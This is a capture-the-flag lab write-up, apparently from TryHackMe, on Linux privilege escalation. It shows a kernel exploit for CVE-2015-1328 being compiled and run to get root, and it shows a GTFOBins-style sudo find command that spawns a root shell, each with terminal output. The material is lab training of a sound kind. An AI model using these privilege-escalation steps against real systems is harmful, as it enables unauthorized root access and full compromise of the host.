# Privilege Escalation: Kernel Exploits

As the name suggests, the best way to start searching for a kernel exploit is to check the kernel version.

```
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

$ uname -a 
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

From this output we can see that the kernel version is:

3.13.0-24-generic

After searching, I found that this version has a public vulnerability: CVE-2015-1328.

Exploit available on Exploit-DB:
https://www.exploit-db.com/exploits/37292

I used the code from Exploit-DB to perform the exploitation. However, not every CVE has a public exploit, and sometimes the available code is incomplete or unstable.

```
$ nano exploit.c 
$ ls
exploit.c
$ gcc exploit.c -o exploit  
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)

$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

After running the exploit, we successfully gained root privileges.

In this exercise, we are looking for a specific file name. The best way to find it is to use the find command:

```
# find / -name flag1.txt
/home/matt/flag1.txt

# cat /home/matt/flag1.txt
THM-X
```
# Privilege Escalation: Sudo

As the name suggests, let’s check whether the user can use sudo.

```
$ sudo -l
Matching Defaults entries for karen on ip-10-67-179-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-67-179-12:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

We can see that the user can run find, less, and nano as root without providing a password (NOPASSWD).

This means we can potentially escalate privileges using GTFOBins.

GTFOBins is a curated list of Unix-like binaries that can be abused to bypass local security restrictions in misconfigured systems.

Using the find binary, we can spawn a root shell:

```
$ sudo find . -exec /bin/sh \; -quit
# find / -name flag2.txt
/home/ubuntu/flag2.txt

# cat /home/ubuntu/flag2.txt
THM-X
```

Because find is executed with sudo, the spawned shell runs with root privileges, allowing us to access restricted files and fully compromise the system.

Misconfigured sudo permissions are one of the most common and easiest privilege escalation vectors in Linux systems.
